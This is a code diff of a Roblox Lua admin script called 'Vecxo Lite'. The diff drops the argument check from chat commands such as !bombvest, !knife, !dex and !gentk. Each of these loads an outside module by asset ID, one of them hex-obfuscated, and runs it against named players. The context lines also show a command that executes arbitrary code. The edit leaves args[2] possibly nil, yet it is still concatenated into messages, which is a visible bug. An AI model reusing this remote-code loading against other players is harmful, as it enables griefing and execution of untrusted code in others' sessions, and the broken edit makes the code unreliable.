@@ -1115,7 +1115,7 @@ local function processCommand(sender, msg)
 		else
 			notifyv2(sender, "Vecxo's admin", "❌ Issue executing code: " .. err)
 		end
-	elseif cmd == "!re" and args[2] then
+	elseif cmd == "!re" then
 		local targets = GetPlayers(args[2], sender)
 		if #targets == 0 then
 			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
@@ -1129,49 +1129,49 @@ local function processCommand(sender, msg)
 		showCommandGui(sender)
 	elseif cmd == "!bans" then
 		showBannedList(sender, bannedPlayers)
-	elseif cmd == "!stickbeater" and args[2] then
+	elseif cmd == "!stickbeater" then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			require(5813743814).load(plr.Name)
 			notifyv2(sender, "[Vecxo Lite]", "✅ Ran stick beater on " ..plr.Name.." successfully")
 		end
-	elseif cmd == "!knife" and args[2] then
+	elseif cmd == "!knife" then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			require(74444736936643)(plr.Name, "Grab Knife V1")
 			notifyv2(sender, "[Vecxo Lite]", "✅ Ran grab knife V1 on " ..plr.Name.." successfully")
 		end	
-	elseif cmd == "!magician" and args[2] then
+	elseif cmd == "!magician" then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			require(6438184104).load(plr.Name)
 			notifyv2(sender, "[Vecxo Lite]", "✅ Ran magician on " ..plr.Name.." successfully")
 		end
-	elseif cmd == "!bombvest" and args[2] then
+	elseif cmd == "!bombvest" then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			require(0x49731b7f).load(plr.Name)
 			notifyv2(sender, "[Vecxo Lite]", "✅ Ran bomb vest on " ..plr.Name.." successfully")
 		end
-	elseif cmd == "!toolgun" and args[2] then
+	elseif cmd == "!toolgun" then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			require(14108404712).mingebag(plr.Name)
 			notifyv2(sender, "[Vecxo Lite]", "✅ Ran tool gun on " ..plr.Name.." successfully")
 		end
-	elseif cmd == "!dex" and args[2] then
+	elseif cmd == "!dex" then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			require(12146718110):Fire(plr.Name)
 			notifyv2(sender, "[Vecxo Lite]", "✅ Ran DEX explorer on " ..plr.Name.." successfully")
 		end
-	elseif cmd == "!gentk" and args[2] then
+	elseif cmd == "!gentk" then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			require(5430831931).Dark(plr.Name)
 			notifyv2(sender, "[Vecxo Lite]", "✅ Gentleman's killer ran on " ..plr.Name.." successfully")
 		end
-	elseif cmd == "!hang" and args[2] then
+	elseif cmd == "!hang" then
 		local targets = GetPlayers(args[2], sender)
 		for i, plr in ipairs(targets) do
 			if plr.Character and plr.Character:FindFirstChild("Head") and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Torso") then
@@ -1217,7 +1217,7 @@ local function processCommand(sender, msg)
 			end
 		end
 
-	elseif cmd == "!crucify" and args[2] then
+	elseif cmd == "!crucify" then
 		local targets = GetPlayers(args[2], sender)
 		if #targets == 0 then
 			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
